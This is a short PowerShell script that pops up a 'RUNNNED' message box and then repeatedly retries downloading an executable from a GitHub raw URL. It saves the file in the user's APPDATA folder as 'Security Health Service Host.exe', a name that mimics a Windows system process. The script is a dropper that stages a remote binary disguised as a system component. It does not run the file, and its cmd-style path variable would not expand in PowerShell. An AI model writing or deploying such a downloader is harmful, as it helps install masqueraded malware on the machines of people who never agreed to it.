Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('RUNNNED', 'Info', 'OK', 'Information')


function Download($from, $to) {
    while ($true) {
        try {
            Invoke-WebRequest -Uri $from -OutFile $to -UseBasicParsing -ErrorAction Stop
            return
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

download https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe "%APPDATA%\YourAppName\Security Health Service Host.exe"
